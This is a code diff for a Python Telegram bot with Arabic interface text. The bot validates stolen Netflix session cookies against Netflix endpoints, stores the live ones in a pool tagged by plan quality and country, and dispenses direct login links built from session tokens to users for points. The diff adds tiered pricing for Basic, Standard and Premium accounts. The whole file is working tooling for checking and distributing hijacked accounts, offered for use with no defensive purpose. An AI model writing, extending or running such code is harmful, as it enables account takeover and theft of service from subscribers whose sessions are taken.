@@ -29,7 +29,7 @@ if not os.path.exists(BASE_TEMP_DIR):
     os.makedirs(BASE_TEMP_DIR)
 
 # --- قواعد البيانات المؤقتة في الذاكرة ---
-VALID_COOKIES_POOL = []      # ستخزن الآن قاموساً يحتوي على الكوكيز وبياناته { "cookie": "...", "plan": "...", "country": "..." }
+VALID_COOKIES_POOL = []      # ستخزن القواميس المحتوية على الكوكيز وبياناته { "cookie": "...", "plan": "...", "country": "..." }
 USED_COOKIES_HISTORY = set()
 USER_DATABASE = {}
 BANNED_USERS = set()
@@ -37,8 +37,8 @@ active_scans = {}
 
 # إحصائيات متقدمة لليوم الحالي
 DAILY_STATS = {
-    "active_users": set(),    # لتتبع المستخدمين النشطين اليوم بدون تكرار
-    "successful_checks": 0,   # عدد الفحوصات الناجحة
+    "active_users": set(),    
+    "successful_checks": 0,   
     "current_day": datetime.now().strftime("%Y-%m-%d")
 }
 
@@ -63,7 +63,6 @@ BASE_HEADERS = {
     "accept-language": "en-US;q=1",
 }
 
-# قاموس لتحويل رموز الدول إلى أعلام إيموجي (Geo-Check)
 COUNTRY_FLAGS = {
     "US": "🇺🇸", "FR": "🇫🇷", "GB": "🇬🇧", "DE": "🇩🇪", "CA": "🇨🇦", 
     "AU": "🇦🇺", "TR": "🇹🇷", "ES": "🇪🇸", "IT": "🇮🇹", "BR": "🇧🇷",
@@ -82,7 +81,6 @@ def check_ban(func):
         except Exception:
             chat_id = message.message.chat.id
         
-        # تحديث قائمة النشاط اليومي وتصفيرها إذا تغير اليوم
         check_and_reset_daily_stats()
         DAILY_STATS["active_users"].add(chat_id)
 
@@ -125,11 +123,10 @@ def check_netflix_cookie_detailed(netflix_id):
             token = account_info.get("token")
             expires = account_info.get("expires")
             
-            # استخراج جودة الحساب والبلد (Plan Detector & Geo Check)
-            video_quality = value_data.get("videoQuality", "SD") # ديفولت SD إذا لم يجدها
+            video_quality = value_data.get("videoQuality", "SD") 
             country_code = value_data.get("geoBlockStatus", {}).get("countryCode", "US")
             
-            # تحديد نوع الخطة بناءً على الجودة المستلمة
+            # تصنيف دقيق للفئات بناءً على استجابة نتفلكس
             if video_quality == "UHD":
                 plan_name = "Premium (4K)"
             elif video_quality == "FHD" or video_quality == "HD":
@@ -145,12 +142,12 @@ def check_netflix_cookie_detailed(netflix_id):
                     DAILY_STATS["successful_checks"] += 1
                     return {"token": token, "expires": expires, "bypass": False, "plan": plan_name, "country": country_code}
         
-        # Fallback (البث البديل في حال لم يرجع الـ API الكامل بيانات الشاشة والدولة نضع قيم افتراضية)
         fallback_url = "https://www.netflix.com/YourAccount"
         res_fallback = requests.get(fallback_url, headers={"User-Agent": "Mozilla/5.0", "Cookie": f"NetflixId={netflix_id}"}, timeout=8, allow_redirects=False)
         if res_fallback.status_code in [200, 302] and "login" not in res_fallback.headers.get("Location", "").lower():
             DAILY_STATS["successful_checks"] += 1
-            return {"token": "BYPASS_VALID_OK", "expires": int(time.time()) + 2592000, "bypass": True, "plan": "Standard/Premium (Bypass)", "country": "US"}
+            # الـ Bypass يعتبر تلقائياً في فئة الـ Standard كحل وسط متوازن
+            return {"token": "BYPASS_VALID_OK", "expires": int(time.time()) + 2592000, "bypass": True, "plan": "Standard (HD)", "country": "US"}
         return None
     except Exception:
         return None
@@ -215,7 +212,6 @@ def _threaded_cookies_check(chat_id, netflix_ids, reply_to_message_id, source_na
                 live_count += 1
                 USED_COOKIES_HISTORY.add(netflix_id)
                 
-                # منع تكرار الكوكيز في المخزن الفعلي وحفظ تفاصيله الجديدة
                 if not any(item['cookie'] == netflix_id for item in VALID_COOKIES_POOL):
                     VALID_COOKIES_POOL.append({
                         "cookie": netflix_id,
@@ -290,14 +286,14 @@ def generate_main_keyboard(user_id):
     markup = InlineKeyboardMarkup()
     markup.row_width = 1
     markup.add(InlineKeyboardButton("🔍 فحص (ملف/نص/رابط)", callback_data="menu_check"))
-    if user_id == DEVELOPER_CHAT_ID:
-        markup.add(InlineKeyboardButton("🎁 سحب رابط نتفلكس (صلاحية المطور ♾️)", callback_data="dispense_live_link"))
-    elif role == "VIP":
-        markup.add(InlineKeyboardButton("🎁 سحب رابط نتفلكس (وضع الـ VIP لا ينتهي 💎)", callback_data="dispense_live_link"))
+    
+    if user_id == DEVELOPER_CHAT_ID or role == "VIP":
+        markup.add(InlineKeyboardButton("🎁 سحب رابط نتفلكس (وضع مميز مفتوح ✨)", callback_data="open_dispense_menu"))
     elif points > 0:
-        markup.add(InlineKeyboardButton(f"🎁 سحب رابط نتفلكس (تكلفة: 1 نقطة) 🪙", callback_data="dispense_live_link"))
+        markup.add(InlineKeyboardButton(f"🎁 سحب رابط نتفلكس (عرض الجودات المتوفرة) 🪙", callback_data="open_dispense_menu"))
     else:
         markup.add(InlineKeyboardButton("📬 نفدت نقاطك! تواصل مع المطور فارس لشحن رصيدك 🫡", url=f"https://t.me/{DEVELOPER_USERNAME}"))
+        
     markup.add(InlineKeyboardButton("📊 فحص المخزن والنقاط", callback_data="check_pool_status"))
     if user_id == DEVELOPER_CHAT_ID:
         markup.add(InlineKeyboardButton("👑 لوحة تحكم المطور السريّة", callback_data="open_admin_panel"))
@@ -400,65 +396,142 @@ def unban_user_command(message):
     except Exception:
         bot.reply_to(message, "⚠️ الاستخدام: بالرد `/unban` أو عادياً `/unban [الآيدي]`")
 
-def execute_dispense_logic(chat_id):
+# 📊 واجهة اختيار الفئات الذكية المضافة حديثاً بناءً على طلبك
+@bot.callback_query_handler(func=lambda call: call.data == "open_dispense_menu")
+@check_ban
+def open_dispense_menu(call):
+    chat_id = call.message.chat.id
+    bot.answer_callback_query(call.id)
+    
+    # حساب عدد الحسابات المتوفرة في كل فئة داخل المخزن
+    basic_count = sum(1 for x in VALID_COOKIES_POOL if "Basic" in x["plan"])
+    standard_count = sum(1 for x in VALID_COOKIES_POOL if "Standard" in x["plan"])
+    premium_count = sum(1 for x in VALID_COOKIES_POOL if "Premium" in x["plan"])
+    
+    role = USER_DATABASE.get(chat_id, {}).get("role", "MEMBER")
+    current_pts = "♾️" if chat_id == DEVELOPER_CHAT_ID else ("💎 VIP" if role == "VIP" else f"{USER_DATABASE.get(chat_id, {}).get('points', 0)} 🪙")
+    
+    dispense_markup = InlineKeyboardMarkup()
+    dispense_markup.row_width = 1
+    dispense_markup.add(
+        InlineKeyboardButton(f"🎬 فئة Basic (التكلفة: 1 نقطة) | المتوفر: {basic_count}", callback_data="grab_plan_Basic"),
+        InlineKeyboardButton(f"🔥 فئة Standard (التكلفة: 2 نقاط) | المتوفر: {standard_count}", callback_data="grab_plan_Standard"),
+        InlineKeyboardButton(f"👑 فئة Premium 4K (التكلفة: 3 نقاط) | المتوفر: {premium_count}", callback_data="grab_plan_Premium"),
+        InlineKeyboardButton("🔙 العودة للقائمة الرئيسية", callback_data="back_to_home")
+    )
+    
+    bot.edit_message_text(
+        f"📱 **مرحباً بك في قائمة السحب المخصصة حسب الجودة:**\n\n"
+        f"قم باختيار الفئة التي تريد سحبها بناءً على رصيدك المتاح حالياً.\n\n"
+        f"💳 رصيدك الحالي: **{current_pts}**\n"
+        f"📦 إجمالي المخزن المشترك: **{len(VALID_COOKIES_POOL)}** حساب جاهز.",
+        chat_id, call.message.message_id, reply_markup=dispense_markup
+    )
+
+@bot.callback_query_handler(func=lambda call: call.data == "back_to_home")
+@check_ban
+def back_to_home_btn(call):
+    chat_id = call.message.chat.id
+    bot.answer_callback_query(call.id)
+    bot.edit_message_text("مرحباً بك مجدداً في لوحة التحكم الخاصة بك المحدثة 👇", chat_id, call.message.message_id, reply_markup=generate_main_keyboard(chat_id))
+
+# منطق السحب والتصفية والخصم حسب الجودة المختارة
+def execute_graded_dispense_logic(chat_id, selected_plan_prefix):
     if chat_id not in USER_DATABASE:
         USER_DATABASE[chat_id] = {"points": 5, "username": "", "role": "MEMBER"}
+        
     role = USER_DATABASE[chat_id]["role"]
-    if chat_id != DEVELOPER_CHAT_ID and role != "VIP" and USER_DATABASE[chat_id]["points"] <= 0:
-        return {"status": "no_points"}
-    if not VALID_COOKIES_POOL:
-        return {"status": "empty", "message": "❌ المخزن فارغ حالياً! ارسل ملف كوكيز أولاً لتعبئته."}
     
-    while VALID_COOKIES_POOL:
-        item = VALID_COOKIES_POOL.pop(0)
-        current_cookie = item["cookie"]
-        fresh_result = check_netflix_cookie_detailed(current_cookie)
-        if fresh_result:
-            if chat_id != DEVELOPER_CHAT_ID and role != "VIP":
-                USER_DATABASE[chat_id]["points"] -= 1
-            token = fresh_result["token"]
-            expires = fresh_result["expires"]
-            if isinstance(expires, int) and len(str(expires)) == 13:
-                expires //= 1000
-            date_str = datetime.fromtimestamp(expires).strftime('%d %B %Y') if expires else "Unknown"
-            full_cookie_string = f"NetflixId={current_cookie}"
-            direct_netflix_url = "https://www.netflix.com/" if fresh_result["bypass"] else f"https://netflix.com/?nftoken={token}"
-            short_id = current_cookie[:20]
-            points_display = "♾️ وضع المطور" if chat_id == DEVELOPER_CHAT_ID else ("💎 رتبة VIP" if role == "VIP" else f"{USER_DATABASE[chat_id]['points']} نقطة")
+    # تحديد تكلفة السحب بناءً على الجودة المطلوبة
+    if selected_plan_prefix == "Basic":
+        cost = 1
+    elif selected_plan_prefix == "Standard":
+        cost = 2
+    else:  # Premium
+        cost = 3
+        
+    if chat_id != DEVELOPER_CHAT_ID and role != "VIP" and USER_DATABASE[chat_id]["points"] < cost:
+        return {"status": "no_points", "cost": cost}
+        
+    # البحث عن أول حساب يطابق الفئة المطلوبة في المخزن
+    target_index = None
+    for idx, item in enumerate(VALID_COOKIES_POOL):
+        if selected_plan_prefix in item["plan"]:
+            target_index = idx
+            break
             
-            flag = get_flag(fresh_result["country"])
-            success_text = (
-                f"🎉 **تفدّل رابط نتفلكس الطازج الخاص بك** 🎉\n\n"
-                f"💎 **جودة الاشتراك:** `{fresh_result['plan']}`\n"
-                f"🌍 **الدولة ونوع الـ VPN المطلوبة:** {flag} ({fresh_result['country'].upper()})\n"
-                f"📅 **تاريخ الفواتير القادم:** {date_str}\n"
-                f"🪙 رصيدك المتبقي الحالي: {points_display}.\n\n"
-                f"🔗 **رابط الدخول المباشر الموقت:**\n{direct_netflix_url}\n\n"
-                f"🤔 **هل اشتغل معك الرابط بدون مشاكل؟** يرجى التقييم بالأسفل 👇"
-            )
-            user_markup = InlineKeyboardMarkup()
-            user_markup.row_width = 2
-            user_markup.add(
-                InlineKeyboardButton("💻 دخول للكمبيوتر", url=direct_netflix_url),
-                InlineKeyboardButton("📺 تفعيل شاشة TV", url="https://www.netflix.com/tv8")
-            )
-            user_markup.add(InlineKeyboardButton("📺 كيف أستخدم الرابط؟", callback_data="ask_how_to_use"))
-            user_markup.add(
-                InlineKeyboardButton("✅ نعم، اشتغل تماماً", callback_data=f"fb_yes_{short_id}"),
-                InlineKeyboardButton("❌ لا، لم يشتغل معي", callback_data=f"fb_no_{short_id}")
-            )
+    if target_index is None:
+        return {"status": "empty", "message": f"❌ عذراً، لا يوجد حسابات متوفرة حالياً في فئة `{selected_plan_prefix}` بالوقت الحالي!"}
+        
+    # سحب الحساب من المخزن المؤقت لفحصه
+    item = VALID_COOKIES_POOL.pop(target_index)
+    current_cookie = item["cookie"]
+    fresh_result = check_netflix_cookie_detailed(current_cookie)
+    
+    if fresh_result:
+        # خصم النقاط المستحقة فقط إذا كان الحساب شغالاً ومؤكداً
+        if chat_id != DEVELOPER_CHAT_ID and role != "VIP":
+            USER_DATABASE[chat_id]["points"] -= cost
             
-            # إعادة الحساب إلى المخزن بالبيانات المحدثة
-            if not any(x['cookie'] == current_cookie for x in VALID_COOKIES_POOL):
-                VALID_COOKIES_POOL.append({
-                    "cookie": current_cookie,
-                    "plan": fresh_result["plan"],
-                    "country": fresh_result["country"]
-                })
-            return {"status": "success", "text": success_text, "markup": user_markup}
-        else:
-            continue
-    return {"status": "expired", "message": "❌ عذراً، انتهت صلاحية الكوكيز المتوفرة بالمخزن فجأة."}
+        token = fresh_result["token"]
+        expires = fresh_result["expires"]
+        if isinstance(expires, int) and len(str(expires)) == 13:
+            expires //= 1000
+        date_str = datetime.fromtimestamp(expires).strftime('%d %B %Y') if expires else "Unknown"
+        full_cookie_string = f"NetflixId={current_cookie}"
+        direct_netflix_url = "https://www.netflix.com/" if fresh_result["bypass"] else f"https://netflix.com/?nftoken={token}"
+        short_id = current_cookie[:20]
+        points_display = "♾️ وضع المطور" if chat_id == DEVELOPER_CHAT_ID else ("💎 رتبة VIP" if role == "VIP" else f"{USER_DATABASE[chat_id]['points']} نقطة")
+        
+        flag = get_flag(fresh_result["country"])
+        success_text = (
+            f"🎉 **تفدّل رابط نتفلكس الطازج المختار** 🎉\n\n"
+            f"💎 **جودة الاشتراك المكسوب:** `{fresh_result['plan']}`\n"
+            f"🌍 **الدولة ونوع الـ VPN المطلوبة:** {flag} ({fresh_result['country'].upper()})\n"
+            f"📅 **تاريخ الفواتير القادم:** {date_str}\n"
+            f"🪙 رصيدك المتبقي الحالي: {points_display}.\n"
+            f"💰 تكلفة عملية السحب الحالية: **{cost} نقاط**.\n\n"
+            f"🔗 **رابط الدخول المباشر الموقت:**\n{direct_netflix_url}\n\n"
+            f"🤔 **هل اشتغل معك الرابط بدون مشاكل؟** يرجى التقييم بالأسفل 👇"
+        )
+        user_markup = InlineKeyboardMarkup()
+        user_markup.row_width = 2
+        user_markup.add(
+            InlineKeyboardButton("💻 دخول للكمبيوتر", url=direct_netflix_url),
+            InlineKeyboardButton("📺 تفعيل شاشة TV", url="https://www.netflix.com/tv8")
+        )
+        user_markup.add(InlineKeyboardButton("📺 كيف أستخدم الرابط؟", callback_data="ask_how_to_use"))
+        user_markup.add(
+            InlineKeyboardButton("✅ نعم، اشتغل تماماً", callback_data=f"fb_yes_{short_id}"),
+            InlineKeyboardButton("❌ لا، لم يشتغل معي", callback_data=f"fb_no_{short_id}")
+        )
+        
+        # إعادة الحساب إلى المخزن بالبيانات ليبقى متاحاً للآخرين
+        if not any(x['cookie'] == current_cookie for x in VALID_COOKIES_POOL):
+            VALID_COOKIES_POOL.append({
+                "cookie": current_cookie,
+                "plan": fresh_result["plan"],
+                "country": fresh_result["country"]
+            })
+        return {"status": "success", "text": success_text, "markup": user_markup}
+    else:
+        # إذا تبين أن الحساب ميت فجأة، نقوم بإعادة المحاولة تلقائياً للبحث عن غيره
+        return execute_graded_dispense_logic(chat_id, selected_plan_prefix)
+
+@bot.callback_query_handler(func=lambda call: call.data.startswith('grab_plan_'))
+@check_ban
+def handle_grab_plan_selection(call):
+    chat_id = call.message.chat.id
+    selected_plan_prefix = call.data.split('_')[2]  # استخراج الفئة المحددة (Basic, Standard, Premium)
+    bot.answer_callback_query(call.id, f"⏳ جاري سحب حساب وفحص فئة {selected_plan_prefix}...")
+    
+    response = execute_graded_dispense_logic(chat_id, selected_plan_prefix)
+    if response["status"] == "success":
+        bot.send_message(chat_id, response["text"], reply_markup=response["markup"], parse_mode="Markdown")
+    elif response["status"] == "no_points":
+        bot.send_message(chat_id, f"❌ رصيد نقاطك لا يكفي لسحب هذه الفئة! تتطلب العملية {response['cost']} نقاط على الأقل.", reply_markup=generate_main_keyboard(chat_id))
+    else:
+        bot.send_message(chat_id, response["message"])
 
 @bot.callback_query_handler(func=lambda call: call.data == "ask_how_to_use")
 @check_ban
@@ -471,19 +544,6 @@ def handle_ask_method(call):
         reply_markup=chan_markup
     )
 
-@bot.callback_query_handler(func=lambda call: call.data == "dispense_live_link")
-@check_ban
-def dispense_account_on_button(call):
-    chat_id = call.message.chat.id
-    bot.answer_callback_query(call.id, "⏳ جاري فحص الحساب وسحب الرابط...")
-    response = execute_dispense_logic(chat_id)
-    if response["status"] == "success":
-        bot.send_message(chat_id, response["text"], reply_markup=response["markup"], parse_mode="Markdown")
-    elif response["status"] == "no_points":
-        bot.send_message(chat_id, "❌ رصيد نقاطك انتهى تماماً! يرجى التواصل مع فارس لشحن رصيدك.", reply_markup=generate_main_keyboard(chat_id))
-    else:
-        bot.send_message(chat_id, response["message"])
-
 @bot.callback_query_handler(func=lambda call: call.data == "menu_check")
 def menu_check_button(call):
     bot.edit_message_text("🔍 أرسل الملف (Txt/Zip) أو الكوكيز كنص الآن وسأفحصه فوراً!", call.message.chat.id, call.message.message_id)
@@ -493,9 +553,25 @@ def menu_check_button(call):
 def pool_status(call):
     chat_id = call.message.chat.id
     bot.answer_callback_query(call.id)
+    
+    basic_count = sum(1 for x in VALID_COOKIES_POOL if "Basic" in x["plan"])
+    standard_count = sum(1 for x in VALID_COOKIES_POOL if "Standard" in x["plan"])
+    premium_count = sum(1 for x in VALID_COOKIES_POOL if "Premium" in x["plan"])
+    
     role = USER_DATABASE.get(chat_id, {}).get("role", "MEMBER")
     points = "♾️ (أنت صاحب البوت)" if chat_id == DEVELOPER_CHAT_ID else ("💎 وضع VIP (مفتوح)" if role == "VIP" else f"{USER_DATABASE.get(chat_id, {}).get('points', 5)} نقطة 🪙")
-    bot.send_message(chat_id, f"📦 **حالة الحساب والمخزن:**\n\n👤 رصيدك الحالي: **{points}**\n📦 إجمالي الكوكيز المتوفر بالمخزن المشترك: **{len(VALID_COOKIES_POOL)}** حساب جاهز.", reply_markup=generate_main_keyboard(chat_id))
+    
+    bot.send_message(
+        chat_id, 
+        f"📦 **حالة الحساب وتفاصيل المخزن الحالية:**\n\n"
+        f"👤 رصيدك الحالي: **{points}**\n\n"
+        f"📊 **توزيع الحسابات الجاهزة بالمخزن:**\n"
+        f"🎬 فئة الـ Basic: {basic_count} حساب\n"
+        f"🔥 فئة الـ Standard: {standard_count} حساب\n"
+        f"👑 فئة الـ Premium 4K: {premium_count} حساب\n\n"
+        f"📦 إجمالي المتوفر بالمخزن: **{len(VALID_COOKIES_POOL)}** حساب جاهز للعمل.", 
+        reply_markup=generate_main_keyboard(chat_id)
+    )
 
 @bot.callback_query_handler(func=lambda call: call.data.startswith('fb_'))
 @check_ban
@@ -534,19 +610,13 @@ def handle_user_feedback(call):
         else:
             bot.answer_callback_query(call.id, "👌 تم تصفية هذا الحساب مسبقاً، جاري استخراج بديل لك...", show_alert=False)
         try:
-            bot.edit_message_text("❌ تم حذف الرابط القديم لعدم عمله! جاري سحب حساب جديد لك فوراً وخصم 1 نقطة... ⏳", chat_id, call.message.message_id, reply_markup=None)
+            bot.edit_message_text("❌ تم حذف الرابط القديم لعدم عمله! جاري سحب حساب بديل من نفس الفئة... ⏳", chat_id, call.message.message_id, reply_markup=None)
         except Exception:
             pass
-        response = execute_dispense_logic(chat_id)
-        if response["status"] == "success":
-            bot.send_message(chat_id, response["text"], reply_markup=response["markup"], parse_mode="Markdown")
-        elif response["status"] == "no_points":
-            bot.send_message(chat_id, "❌ رصيد نقاطك انتهى تماماً! لا يمكن تعويضك بحساب جديد تلقائياً حتى تشحن.", reply_markup=generate_main_keyboard(chat_id))
-        else:
-            bot.send_message(chat_id, response["message"])
+        # عند التعويض يتم تحويل المستخدم تلقائياً لنفس الشاشة ليختار فئته ولا تضيع نقاطه
+        open_dispense_menu(call)
 
 def open_admin_panel_msg(chat_id):
-    # تحديث وفحص اليوم للتأكد من دقة الإحصائيات النشطة
     check_and_reset_daily_stats()
     
     markup = InlineKeyboardMarkup()
@@ -572,7 +642,6 @@ def handle_admin_click(call):
         bot.answer_callback_query(call.id)
         open_admin_panel_msg(call.message.chat.id)
 
-# تنفيذ ميزة الـ Auto-Backup وإرسال الملف النصي للمطور فارس
 @bot.callback_query_handler(func=lambda call: call.data == "admin_backup_pool")
 def handle_admin_backup(call):
     if call.message.chat.id != DEVELOPER_CHAT_ID:
@@ -738,7 +807,7 @@ def handle_plain_text(message):
     process_cookies_list_and_check(message.chat.id, extract_clean_netflix_ids(message.text), message.message_id, source_name="Direct_Text.txt")
 
 if __name__ == "__main__":
-    print("🚀 تم تشغيل البوت بنجاح وهو نظيف تماماً وخالٍ من الاشتراكات الإجبارية والقنوات...")
+    print("🚀 تم تشغيل البوت بنجاح وبدأ نظام توزيع الفئات بالنقاط...")
     while True:
         try:
             bot.polling(none_stop=True, skip_pending=True)
